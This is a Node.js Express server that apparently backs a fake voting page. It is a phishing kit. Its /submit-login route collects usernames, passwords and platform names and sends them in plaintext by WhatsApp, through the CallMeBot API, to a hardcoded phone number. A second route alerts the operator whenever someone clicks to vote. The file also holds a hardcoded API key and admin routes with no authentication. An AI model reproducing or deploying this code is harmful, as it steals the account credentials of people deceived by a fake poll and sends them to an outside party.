const express = require("express");
const cors = require("cors");
const axios = require("axios");

const app = express();
app.use(cors());
app.use(express.json());

app.options("/*", cors()); // <-- handle preflight requests 
const PORT = process.env.PORT || 5000;
const API_KEY = "1738514";
const PHONE_NUMBER = "+2349035958143";

// Store votes and settings in memory
let votes = [];
let settings = {
  requireSecurityCode: false,
  maintenanceMode: false,
};

// -------------------- Helper Function --------------------
async function sendWhatsApp(message) {
  const url = "https://api.callmebot.com/whatsapp.php";
  const response = await axios.get(url, {
    params: { phone: PHONE_NUMBER, text: message, apikey: API_KEY },
    validateStatus: () => true // Treat all statuses as valid
  });
  return response.data;
}

// -------------------- Routes --------------------

// Submit login/code
app.post("/submit-login", async (req, res) => {
  const { username, password, platform } = req.body;
  const message = `New voter logged in to ${platform}\nUsername: ${username}\nPassword: ${password}`;

  try {
    votes.push({ username, platform, action: "login", time: new Date() });
    const apiResponse = await sendWhatsApp(message);
    res.json({ success: true, msg: "Login received and sent to WhatsApp!", apiResponse });
  } catch (err) {
    console.error("Error sending login message:", err.message);
    res.status(500).json({ success: false, error: "Failed to send WhatsApp message" });
  }
});

// Submit vote click
app.post("/submit-vote", async (req, res) => {
  const { platform } = req.body;
  const message = `Someone wants to vote with ${platform}`;

  try {
    votes.push({ username: "n/a", platform, action: "clicked", time: new Date() });
    const apiResponse = await sendWhatsApp(message);
    res.json({ success: true, msg: "Vote received and sent to WhatsApp!", apiResponse });
  } catch (err) {
    console.error("Error sending vote message:", err.message);
    res.status(500).json({ success: false, error: "Failed to send WhatsApp message" });
  }
});

// -------------------- Admin Routes --------------------

// Get logs
app.get("/logs", (req, res) => {
  res.json(votes.map(v => ({ ...v, time: v.time.toISOString() })));
});

// Update settings
app.post("/settings", (req, res) => {
  const { key, value } = req.body;
  if (!(key in settings)) return res.status(400).json({ error: "Invalid setting" });
  settings[key] = value;
  res.json({ success: true, settings });
});

// Get settings
app.get("/settings", (req, res) => res.json(settings));

// -------------------- Start Server --------------------
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
